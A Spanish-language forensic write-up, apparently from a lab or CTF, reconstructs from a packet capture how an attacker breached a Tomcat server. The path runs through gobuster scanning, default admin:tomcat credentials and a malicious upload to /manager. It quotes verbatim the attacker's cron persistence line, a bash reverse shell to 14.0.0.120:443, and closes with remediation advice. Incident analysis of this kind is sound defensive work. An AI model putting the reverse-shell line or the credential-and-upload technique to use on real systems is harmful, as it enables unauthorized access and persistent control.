# Análisis forense de red: intrusión en Apache Tomcat (`10.0.0.112`)

Revisión de captura de tráfico de red en Wireshark para reconstruir cómo un atacante accedió al servidor `10.0.0.112:8080` (Apache Tomcat 7.0.88), qué credenciales utilizó, cómo estableció el *reverse shell* y qué mecanismo dejó para persistir.

## Datos clave del incidente

- **IP del atacante:** `14.0.0.120`
- **Servidor objetivo:** `10.0.0.112:8080` (`Apache Tomcat/7.0.88`, `Apache-Coyote/1.1`)
- **Herramienta de enumeración:** `gobuster/3.6` (visible en el `User-Agent`)
- **Panel encontrado:** `/manager` (redirige a `/manager/`)
- **Credenciales:** `admin:tomcat` (`YWRtaW46dG9tY2F0` en Base64)
- **Carga de archivo:** `POST /manager/html/upload...`
- **Conexión inversa (*reverse shell*):** `14.0.0.120:443`
- **Persistencia:** tarea en `crontab` a partir de `/tmp/cron`

## Reconstrucción paso a paso

### 1. Reconocimiento y búsqueda de rutas
Siguiendo los flujos HTTP hacia `10.0.0.112:8080`, se observa a `gobuster/3.6` probando rutas administrativas y de aplicación comunes (como `/admin-console`, `/examples/servlet/org.apache.catalina.INVOKER.TroubleShooter` o `/jmx-console`), recibiendo `404 Not Found`.

El hallazgo relevante ocurre al solicitar `GET /manager HTTP/1.1` y recibir `302 Found` con `Location: /manager/`, avanzando después hacia rutas del gestor como `/manager/list`.

### 2. Autenticación en el panel de Tomcat
Filtrando con `http.authbasic`, aparecen las peticiones hacia `/manager/html` desde `14.0.0.120`. En la cabecera `Authorization: Basic` figura `YWRtaW46dG9tY2F0`, que al decodificarse en Base64 corresponde a `admin:tomcat`. El acceso queda confirmado al cargarse los recursos de la interfaz del Manager y avanzar hacia `/manager/html/upload`.

### 3. Intento de despliegue y ejecución remota
Una vez dentro de `/manager/html`, se identifica la petición `POST /manager/html/upload;jsessionid=...` desde `14.0.0.120` hacia `10.0.0.112`, correspondiente a la subida de un archivo malicioso para obtener ejecución remota en el servidor.

### 4. *Reverse shell* y persistencia
Al filtrar los paquetes `SYN, ACK` emitidos por el atacante (`ip.src == 14.0.0.120 && tcp.flags == 0x012`), destacan las conexiones salientes del servidor hacia `14.0.0.120` en los puertos `80` y `443`.

Siguiendo el flujo TCP hacia `14.0.0.120:443`, se observa la sesión interactiva y los comandos ejecutados:
- Verificación de privilegios con `whoami`, devolviendo `root`.
- Cambio al directorio temporal (`cd /tmp`, `pwd`).
- Creación y registro de una tarea programada en `crontab` para ejecutar un *reverse shell* cada minuto:

```text
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'

Comandos registrados en el flujo: echo "... " > cron, crontab -i cron y crontab -l.

Medidas básicas de corrección
Cambiar las credenciales por defecto o débiles (admin:tomcat) y revisar tomcat-users.xml.

Restringir el acceso a /manager y /host-manager únicamente a direcciones IP de administración autorizadas.

Ejecutar el servicio de Apache Tomcat con un usuario sin privilegios de root.

Eliminar /tmp/cron, revisar y limpiar las entradas no autorizadas de crontab, y restringir conexiones salientes no esperadas desde el servidor.